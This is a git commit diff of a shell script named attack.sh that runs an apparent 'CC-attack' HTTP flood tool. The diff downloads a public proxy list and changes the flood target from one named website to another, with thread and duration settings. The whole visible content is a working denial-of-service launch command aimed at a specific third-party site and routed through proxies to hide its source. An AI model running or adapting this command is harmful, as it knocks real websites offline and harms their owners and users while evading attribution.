830896a31dbd052c3622ddf58f0c013507cf86ca
NyaaCaster <110224598+NyaaCaster@users.noreply.github.com>
2023-01-07 16:55:13 +0800

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -6,7 +6,8 @@ echo "CC-attack"
 cd CC-attack
 git pull
 curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o http.txt
-python3 cc.py -url http://fwe22.top/ -f http.txt -v 5 -s 30
+#python3 cc.py -url http://fwe22.top/ -f http.txt -v 5 -s 30
+python3 cc.py -url http://fwe88.top/ -f http.txt -v 5 -s 30
 cd ..
 
 echo ""
